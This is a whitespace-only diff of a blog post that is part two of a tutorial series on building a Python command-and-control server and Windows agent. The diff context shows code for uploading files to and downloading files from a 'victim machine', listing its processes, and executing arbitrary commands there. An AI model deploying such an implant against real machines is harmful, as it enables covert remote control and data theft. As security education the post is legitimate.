@@ -16,7 +16,7 @@ tags:
   - command and control
 ---
 
-Hey everyone!  Welcome to Part 2 of the **Create your own C2 series**.  You have likely learned by now this is not going to be some crazy beefed out C2.  My main aim for this series is to help the avid cyber enthusiast better understand how sockets work, learn the basic components of a C2 using Python, and do it all without much coding involved.  Yes, we will get into process migration, privilege escalation, etc.  I promise!  But I wanted to first start with the basics and help you, the reader, understand how some of the standard C2 functions can be implemented using a simple and accessible programming language such as Python 🐍.  
+Hey everyone!  Welcome to Part 2 of the **Create your own C2 series**.  You have likely learned by now this is not going to be some crazy beefed out C2.  My main aim for this series is to help the avid cyber enthusiast better understand how sockets work, learn the basic components of a C2 using Python, and do it all without much coding involved.  Yes, we will get into process migration, privilege escalation, etc.  I promise!  But I wanted to first start with the basics and help you, the reader, understand how some of the standard C2 functions can be implemented using a simple and accessible programming language such as Python 🐍.
 
 When I was getting started learning Python, it appealed to me greatly due to its ease of use and cross platform OS compatibility.  I'm a huge fan of Linux, specifically `Debian` and `Arch/Manjaro` Linux.  Being able to code both my C2 server console and Windows agents in Python and port them to Linux and Windows, respectively, is an amazing thing!  I realize Python is not the only coding language that lends itself to cross platform functionality, but for whatever reason it's what stuck for me.  If you've never explored Python, I hope this is a fun introduction to the language. Well, you know I have to ramble for a few minutes before the actual code gets presented to you.  It's my annoying trademark move 😸  Let's get started on Part 2 okay?
 
@@ -46,7 +46,7 @@ Today, we're going to simplify things even more while also adding in four new fe
 - The ability to list `running processes` on the victim machine
 - The ability to `upload` and `download` files to and from our implant/agent!
 - Lastly, the ability to run commands, any commands, on the agent using the `execute` command!
-  
+
 Aesthetically, it looks like crap having a menu always in your face using a C2.  If we want a menu, we'll ask for one right?! Yeah, I agree 😄  The first shell, which I called << elev8 >> (yeah cheesy, i get it) is just your basic prompt and remains unchanged from Part 1.  Type 'help' or '?' to access the commands.  It's very basic:
 
 ![image](https://github.com/user-attachments/assets/1ec6a5ec-5202-469b-901d-d081942997d9)
@@ -136,7 +136,7 @@ if ":upload:" in data:
     filesize=data[3]
     filepath = UPLOAD_DIR + "/" + filename
     print(filepath)
-            
+
     exit_event.clear()
     handler_thread3 = threading.Thread(target=recfile, args=(filepath,filesize))
     handler_thread3.daemon = True
@@ -155,7 +155,7 @@ if "~download~" in data:
     filepath = data[2]
     print(filepath)
     time.sleep(3)
-            
+
     if not os.path.isfile(filepath):
         print(f"Error: File '{filepath}' does not exist.")
         return
@@ -168,7 +168,7 @@ if "~download~" in data:
     with open(filepath, 'rb') as f:
         for chunk in iter(lambda: f.read(4096), b''):
             client.sendall(chunk)
-                  
+
     #client.send(b"file sent!\n")
     time.sleep(3)
 ```
@@ -187,7 +187,7 @@ if "c0mm@nd" in data:
     output=output.encode()
     proc.stdin.close()
     proc.terminate()
-            
+
     client.sendall(b"returned output: \n"+output+b"\n:endofoutput:\n")
 ```
 
@@ -209,7 +209,7 @@ Here, we remove the code that would clear the screen automatically each time we 
         """
         try:
             choice=input(Fore.YELLOW + "[C2-Shell]:~$ " + Fore.WHITE)
-        except:    
+        except:
             print(Fore.RED + "[!] enter a number..." + Fore.WHITE)
             time.sleep(2)
             return
@@ -245,7 +245,7 @@ if choice == "recv":
                 print("did you intentionally include a file without a file extension? I'm going to assume not and back out")
                 print("If this was intended, well...edit this code :D")
                 return
-            filename = file_path.rsplit("\\", 1)[-1] 
+            filename = file_path.rsplit("\\", 1)[-1]
             print(filename)
             clientlist[selection][1].send(f"~download~{file_path}~\n".encode())
             filesize=clientlist[selection][1].recv(1024)
@@ -281,12 +281,12 @@ if choice == "send":
             cresponse=clientlist[selection][1].recv(1024)
             print(cresponse.decode('UTF-8'))
             time.sleep(3)
-            
+
             with open(file_path, 'rb') as f, tqdm(total=filesize, unit="B", unit_scale=True, desc=f"Uploading {filename}") as pbar:
                 for chunk in iter(lambda: f.read(4096), b''):
                     clientlist[selection][1].sendall(chunk)
                     pbar.update(len(chunk))
-            
+
             cresponse2=clientlist[selection][1].recv(1024)
             print(cresponse2.decode('UTF-8'))
             time.sleep(3)
@@ -304,7 +304,7 @@ if choice == "procs":
                 #clientlist[selection][1].settimeout(4)
                 while True:
                     data2=clientlist[selection][1].recv(1024)
-                  
+
                     if not data2 or ":endofoutput:" in data2.decode():
                         endoutput=data2.decode()
                         endoutput = endoutput.replace(":endofoutput:", "")
@@ -332,7 +332,7 @@ if choice == "execute":
                 #clientlist[selection][1].settimeout(4)
                 while True:
                     data2=clientlist[selection][1].recv(1024)
-                  
+
                     if not data2 or ":endofoutput:" in data2.decode():
                         endoutput=data2.decode()
                         endoutput = endoutput.replace(":endofoutput:", "")
@@ -351,7 +351,7 @@ Source code located in the usual spot:
 
 [https://github.com/g3tsyst3m/CodefromBlog](https://github.com/g3tsyst3m/CodefromBlog)
 
-Also, here's the GIF I used in my X post that demo's some of these new features!  
+Also, here's the GIF I used in my X post that demo's some of these new features!
 
 ![c2_part2](https://github.com/user-attachments/assets/debf1b8d-be1f-446f-a62a-e46f2269e565)
 
